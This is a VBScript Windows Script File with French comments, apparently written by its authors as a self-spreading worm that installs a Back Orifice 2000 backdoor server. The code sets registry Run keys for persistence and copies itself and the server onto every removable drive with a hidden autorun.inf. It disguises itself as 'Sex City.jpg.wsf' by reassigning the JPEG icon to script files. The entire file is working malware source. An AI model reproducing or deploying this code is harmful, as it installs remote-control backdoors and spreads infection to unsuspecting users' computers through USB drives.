<JOB id="IncludeExample">
<SCRIPT language="VBScript">
	'-- ver 0.1
	'-- copie automatique de serveur BO2k 
	'- copyright (c) 2007 , Christina & Ne0Krishna
	
	'on error resume next
	'-- initialisation & creation des objets 
	Option Explicit
	Dim FSO, WSSH, dir0 , dir, demarrage1, demarrage2, codeN, hcodeN 
	Dim serverN, src1, src2, r
	
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set WSSH = CreateObject("Wscript.shell")
	Set dir0 = FSO.GetSpecialFolder(1) 

	dir = CStr(dir0) 'transform l'objet en chaine
	demarrage1 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System64"
	demarrage2 = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System12"

	codeN = "Sex City.jpg.wsf"
	hcodeN = "ne0kS.dll.wsf"  ' code caher dans le system32 ou equivalent
	serverN = "ne0kS.exe"
	
	
	
	
	src2 = WScript.ScriptFullName
	'racine du lecteur ou se trouve le script
	'MsgBox InStrRev(src2,"\")
	r = Mid(src2, 1,InStrRev(src2,"\"))
	src1 = r & serverN
	
	'run
	input 
	
	
	'---- SOUS ROUTINE
	sub diversion2()
		Dim fso, f, f2, ts, ts2
		Dim Ligne, i
		Set FSO = CreateObject("Scripting.FileSystemObject")
		
		if (fso.fileexists(dir & "\" & serverN)) then
			wssh.run dir & "\" & serverN
		Else
			'transforme la copie texte du server en exe
			copier src1, dir, serverN
			wssh.run dir & "\" & serverN
			DemarrerDe demarrage2, dir,serverN		'inscrire hserver comme run auto		
		end if
	end sub
	'-------------------------------------
	sub input()
	'-- procedure principale, 
	'-- infection de l'hote et des unites amovibles
	'-- code  = nom visible du script
	'-- hcode = nom de diversion d'une copie du script 
	'-- hserver = nom du serveur BO2k
	Dim ss, location
		ss = cstr(dir)          
		'MsgBox ss 
		location = wscript.ScriptFullName
		if instr(location,ss)=false Then 'verifie si le script s'execute apartir du dossier sys
			diversion2  'premiere execution lorsque l'hote est sain
		Else
			do while time <> "00:00:00"
				detecterracines
				wscript.sleep 180000 
			loop
		end If
		
		detecterracines
		
		if not(fso.fileexists( dir &"\"& hcodeN)) then
			copier location, dir,hcodeN		'copier hCode ver les dossier sys
			DemarrerDe demarrage1, dir,hcodeN		'inscrire hCOde comme run auto		
			ChangerIcone				'changer type icone
		end If			
		
		wscript.sleep 1000 				
		if not(fso.fileexists( dir &"\"& serverN)) Then
			'-- copie du serveur
			copier src1, dir, serverN
			DemarrerDe demarrage2, dir,serverN		'inscrire hserver comme run auto		
		End If
	end sub
	
	'-------------------------------------
	sub DemarrerDe(KEY, Location, prg)
		Set wssh = CreateObject("WScript.Shell")
		wssh.RegWrite KEY, location & "\" & prg 
	
	end Sub

	'-------------------------------------
	Sub copier(src, dest, ren)
	'-- copie un fichier avec possibilite de renomer
		fso.CopyFile src, dest & "\" & ren, true
	end Sub
	
	'-------------------------------------
	Sub createAR( unite, prg )
	'-- create an Autorun inf on submitted "unite" for
	'-- "prg"
	'-- exemple d'appel:  createAR "D:", "prg.exe"
		Dim objFSO
		Dim objStream
		Dim objFile
		
		'creation de autorun
		Set objFSO = CreateObject("scripting.FileSystemObject")
		
		'change les attibuts du fichier pour pouvoir l'ecraser
		if (fso.fileexists(unite & "\autorun.inf")) Then
			Set objFile = objFSO.GetFile(unite & "\autorun.inf")
			objFile.Attributes = 0	'normal
			WScript.Sleep 1000
		End If
		
		Set objStream = objFso.CreateTextFile( unite & "\autorun.inf", true)
		objstream.WriteLine "[AutoRun]"
		objstream.WriteLine "open=wscript """ & prg &""""
		objstream.WriteLine "shellexecute=wscript """ & prg & """"
		objstream.WriteLine "shell\Auto\command=wscript """ & prg & """"
		objstream.WriteLine "shell=Auto"
		
		objStream.Close
		
		WScript.Sleep 1000
		'change les attibut en cache et proteger
		Set objFile = objFSO.GetFile(unite & "\autorun.inf")
		
		objFile.Attributes = 4	'system file
		objFile.Attributes = 2	'hidden file
		'objFile.Attributes = 1	'readonly
	End Sub
	
	'---------------------------------
	sub detecterracines()
	Dim fso, d, dc, s, n, racine,u
	
	Set fso = CreateObject("Scripting.FileSystemObject")
	Set dc = fso.Drives
	
	For Each d in dc
		racine = d.Driveletter & ":"
		u= detectamovibles(racine)	'-- recupere le type de l'unite grace a une fonction
		'msgbox racine
		
		If u ="Amovible" and d.isready then 
			If not (fso.fileexists(racine & "\" & codeN )) then
			End if
			copier WScript.ScriptFullName, racine, codeN   'copie du script
			createAR racine, codeN 'cree un autorun sur la cle.
			copier dir & "\" & serverN, racine, serverN  'copie du server
		End if
	Next
	end Sub
	
	'-------------------------------
	Function detectamovibles(drvpath)
		Dim fso, d, s, t
		Set fso = CreateObject("Scripting.FileSystemObject")
	
		Set d = fso.GetDrive(fso.GetDriveName(fso.GetAbsolutePathName(drvpath)))
		
		Select Case d.DriveType
			Case 0: t = "Inconnu"
			Case 1: t = "Amovible"
			Case 2: t = "Fixe"
			Case 3: t = "Rseau"
			Case 4: t = "CD-ROM"
			Case 5: t = "RAM Disk"
		End Select
	
		detectamovibles = t
	End Function
	
	'----------------------------
	sub ChangerIcone()
		Dim resultat
		resultat = wssh.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\jpegfile\DefaultIcon\")
		wssh.Regwrite"HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Wsffile\DefaultIcon\",resultat
    end Sub

</SCRIPT>
</JOB>
  